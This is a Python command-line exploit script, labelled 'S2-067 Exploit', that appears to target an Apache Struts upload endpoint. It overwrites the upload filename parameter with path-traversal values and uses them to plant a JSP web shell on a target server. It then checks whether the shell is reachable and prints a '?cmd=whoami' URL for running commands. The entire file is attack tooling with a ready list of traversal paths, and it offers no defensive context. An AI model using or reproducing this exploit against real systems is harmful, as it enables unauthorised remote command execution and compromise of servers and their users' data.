import requests
import argparse
from urllib.parse import urljoin
from requests_toolbelt.multipart.encoder import MultipartEncoder


def upload_file(target_url, upload_endpoint, file_path, destination_path, verify=False):
    """
    Upload a WebShell file to the target using parameter overwrite and path traversal.
    """
    upload_url = urljoin(target_url, upload_endpoint)
    print(f"[INFO] Uploading WebShell to {upload_url}...")

    headers = {"User-Agent": "Mozilla/5.0"}
    with open(file_path, "rb") as f:
        webshell_content = f.read()

    files_payload = {
        "upload": (file_path, webshell_content, "application/octet-stream"),
        "uploadFileName": destination_path
    }

    try:
        response = requests.post(upload_url, headers=headers, files=files_payload, timeout=10)
        if response.status_code == 200:
            print(f"[SUCCESS] WebShell uploaded successfully: {destination_path}")
            if verify:
                verify_uploaded_file(target_url, destination_path)
        else:
            print(f"[ERROR] Upload failed. HTTP {response.status_code}")
    except requests.RequestException as e:
        print(f"[ERROR] Request failed: {e}")


def verify_uploaded_file(target_url, file_path):
    """Verify if the uploaded WebShell file is accessible."""
    file_url = urljoin(target_url, file_path)
    print(f"[INFO] Verifying uploaded WebShell: {file_url}")
    try:
        response = requests.get(file_url, timeout=10)
        if response.status_code == 200:
            print(f"[ALERT] WebShell uploaded and accessible: {file_url}?cmd=whoami")
        else:
            print(f"[INFO] WebShell not accessible. HTTP Status: {response.status_code}")
    except requests.RequestException as e:
        print(f"[ERROR] Verification failed: {e}")


def predefined_paths():
    """Return a list of common test paths for -p option."""
    return [
        "../../../../../webapps/ROOT/evil.jsp",
        "/tmp/webshell.jsp",
        "/var/www/html/test.jsp"
    ]


def main():
    parser = argparse.ArgumentParser(description="S2-067 Exploit - Advanced Testing Modes")
    parser.add_argument("-u", "--url", required=True, help="Target base URL (e.g., http://example.com)")
    parser.add_argument("--upload_endpoint", required=True, help="Path to upload endpoint (e.g., /uploads.action)")
    parser.add_argument("--webshell", required=True, help="Path to WebShell file")
    parser.add_argument("-s", "--single", help="Single target path for testing (e.g., ../../../../../webapps/ROOT/evil.jsp)")
    parser.add_argument("-d", "--directory", nargs="+", help="Multiple target paths for testing")
    parser.add_argument("-p", "--predefined", action="store_true", help="Use predefined common paths")
    parser.add_argument("-v", "--verify", action="store_true", help="Verify uploaded file")
    args = parser.parse_args()

    if args.single:
        # Single path test
        print(f"[INFO] Testing single path: {args.single}")
        upload_file(args.url.rstrip("/"), args.upload_endpoint, args.webshell, args.single, args.verify)
    elif args.directory:
        # Multi-path test
        for path in args.directory:
            print(f"[INFO] Testing custom path: {path}")
            upload_file(args.url.rstrip("/"), args.upload_endpoint, args.webshell, path, args.verify)
    elif args.predefined:
        # Predefined path test
        for path in predefined_paths():
            print(f"[INFO] Testing predefined path: {path}")
            upload_file(args.url.rstrip("/"), args.upload_endpoint, args.webshell, path, args.verify)
    else:
        print("[ERROR] No testing mode selected. Use -s, -d, or -p.")
        parser.print_help()


if __name__ == "__main__":
    main()
